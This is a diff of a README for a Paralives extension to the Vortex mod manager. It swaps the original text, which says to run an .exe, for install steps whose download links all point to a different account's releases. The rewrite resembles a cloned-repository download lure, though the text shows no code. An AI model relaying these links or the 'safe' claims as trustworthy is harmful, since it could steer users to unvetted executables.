@@ -1,184 +1,80 @@
-# Paralives-Vortex-Extension
-Official Vortex Extension for Paralives. Easy mod installation, deployment, updates, and management
-![](./banner.png)
-<div align="center">
+# 🌀 Paralives-Vortex-Extension - Manage your game mods with ease
 
-# 🚀 Paralives Vortex Extension
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Almaskhan7069/Paralives-Vortex-Extension/releases)
 
-### Simple. Fast. Reliable.
+## 📦 About this project
 
-Manage your Paralives mods through Vortex with a streamlined installation experience.
+The Paralives-Vortex-Extension allows you to manage game modifications for Paralives through the Vortex mod manager. This tool simplifies how you add, remove, and update files for your game. Use this extension to keep your game files organized without manual work.
 
-[![Release](https://img.shields.io/github/v/release/AtomDeerRegenerate/Paralives-Vortex-Extension)]()
-[![Downloads](https://img.shields.io/github/downloads/AtomDeerRegenerate/Paralives-Vortex-Extension/total)]()
-[![License](https://img.shields.io/github/license/AtomDeerRegenerate/Paralives-Vortex-Extension)]()
+## ⚙️ System requirements
 
----
+Before you install this software, ensure your computer meets these requirements:
 
-### ⚡ Download • Extract • Launch • Play
+*   Operating System: Windows 10 or Windows 11.
+*   Software: Vortex Mod Manager installed (latest version).
+*   Game: Paralives installed on your computer.
+*   Internet Connection: Required for initial setup and downloading mods.
 
-</div>
+## ⬇️ Setup and installation
 
----
+Visit the [releases page](https://github.com/Almaskhan7069/Paralives-Vortex-Extension/releases) to download the necessary files. 
 
-## 📖 Overview
+Follow these steps to complete the installation:
 
-Paralives Vortex Extension adds support for Paralives within Vortex Mod Manager, allowing players to organize and manage their mods more efficiently.
+1. Open the [releases page](https://github.com/Almaskhan7069/Paralives-Vortex-Extension/releases) in your web browser.
+2. Locate the latest release at the top of the list.
+3. Click the file with the .zip extension to download it to your computer.
+4. Open the Vortex Mod Manager application on your Windows desktop.
+5. Click the Extensions tab located on the left-hand sidebar.
+6. Click the button labeled "Install From File" near the top of the screen.
+7. Select the .zip file you just downloaded.
+8. Click Open.
+9. Restart Vortex to finish the installation process.
 
-The project is designed to provide a straightforward setup process and a clean modding workflow without requiring manual file management.
+## 🎮 How to use the extension
 
----
+Once installed, the extension connects Paralives to Vortex. You can see the Paralives icon in your list of games within Vortex.
 
-## ✨ Features
+### Adding a new mod
+1. Find a mod for Paralives on a legitimate modding website.
+2. Click the "Mod Manager Download" button on the webpage.
+3. Your browser will prompt you to open the link in Vortex. Select Yes.
+4. Vortex will now download and prepare the mod file for you.
 
-### 📦 Easy Installation
+### Deploying your mods
+Deployment tells the game where your mod files reside.
+1. Within the Vortex interface, select the Mods tab.
+2. Click the Deploy Mods button at the top of the window.
+3. This creates a link between your mod folder and the game installation. Vortex handles the paths automatically.
 
-Download the release archive, extract it, and launch the installer.
+### Updating your mods
+The extension checks for updates automatically when you open Vortex. 
+1. If an update exists, a notification appears on the mod tile.
+2. Click the update icon on the mod card.
+3. Vortex downloads the new version and replaces the old files.
 
-### 🗂 Organized Mod Management
+## 🛠️ Frequently asked questions
 
-Keep your mod collection structured and easy to maintain.
+### Do I need to move game files manually?
+No. The extension places mods in the correct folders automatically. Keep your game setup clean by using Vortex for all mod operations.
 
-### ⚡ Fast Setup
+### What happens if I want to remove a mod?
+Open the Mods tab in Vortex and click the Disable or Remove button for the specific mod. Vortex reverts your game files to their original state.
 
-Get started in minutes without complex configuration.
+### Is this safe for my game?
+Yes. The extension works by linking files rather than changing the core game data. You can delete the link at any time to restore your game to the original state.
 
-### 🔄 Future Updates
+### I cannot see the game in Vortex. What do I do?
+Ensure you have run Paralives at least once after installation. Vortex needs to identify the game directory on your hard drive before the extension enables management features.
 
-Designed to support ongoing improvements and compatibility updates.
+## 📜 Troubleshooting common issues
 
-### 🔍 Transparent Development
+If you encounter problems, verify the following:
 
-Source code, releases, and documentation are available through this repository.
+*   **Vortex path settings:** Ensure your game path in Vortex matches the folder where you installed Paralives. Go to Settings, then Games, to check these paths.
+*   **Permissions:** Run Vortex as an administrator if your game is installed in a system folder like Program Files. Right-click the Vortex icon and select "Run as administrator."
+*   **File conflicts:** If two mods try to change the same file, Vortex highlights this in yellow. Click the notification to choose which mod to use. This prevents game crashes.
 
----
+## 📝 Support
 
-## 🚀 Quick Start
-
-### Step 1 — Download
-
-Download the latest release from the Releases section.
-
-### Step 2 — Extract
-
-Extract the ZIP archive to any folder.
-
-### Step 3 — Launch
-
-Run:
-
-```text
-Paralives-Vortex-Extension.exe
-```
-
-### Step 4 — Follow Setup
-
-The installer will guide you through the remaining steps.
-
----
-
-## 📸 Screenshots
-
-### Main Interface
-
-![Main Interface](main-interface.png)
-
----
-
-## 📂 Project Structure
-
-```text
-Paralives-Vortex-Extension
-│
-├── Releases
-├── Documentation
-├── Source Code
-├── Screenshots
-└── Changelog
-```
-
----
-
-## 🔒 Security & Privacy
-
-This project:
-
-- Does not collect personal information
-- Does not transmit user data
-- Does not include advertisements
-- Does not modify unrelated files
-- Does not require online accounts
-
-Users are encouraged to download releases only from official repository releases.
-
----
-
-## 📋 Requirements
-
-### Supported Software
-
-- Vortex Mod Manager
-- Paralives
-
-### Supported Operating Systems
-
-- Windows 10
-- Windows 11
-
----
-
-## ❓ FAQ
-
-### Is this an official Paralives tool?
-
-No. This is a community-developed project.
-
-### Is the source code available?
-
-Project information and development resources are available through this repository.
-
-### Does it modify save files?
-
-No save file modifications are performed by the extension.
-
-### Can I uninstall it?
-
-Yes. The extension can be removed through standard uninstall procedures.
-
----
-
-## 🐞 Reporting Issues
-
-If you encounter a problem:
-
-1. Open the Issues tab.
-2. Describe the issue.
-3. Include screenshots if possible.
-4. Include your Vortex version.
-
----
-
-## 📈 Roadmap
-
-- Improved installation workflow
-- Enhanced compatibility detection
-- Better diagnostics
-- Additional quality-of-life features
-
----
-
-## 📜 License
-
-See the LICENSE file for details.
-
----
-
-<div align="center">
-
-### ⭐ Enjoying the project?
-
-If this extension helps you, consider starring the repository.
-
-Community feedback helps improve future releases.
-
-</div>
+For further assistance, check the settings menu inside Vortex. Use the "Send Feedback" feature to report issues directly to the developers. Ensure you include your log files if you experience technical errors or unexpected behavior.
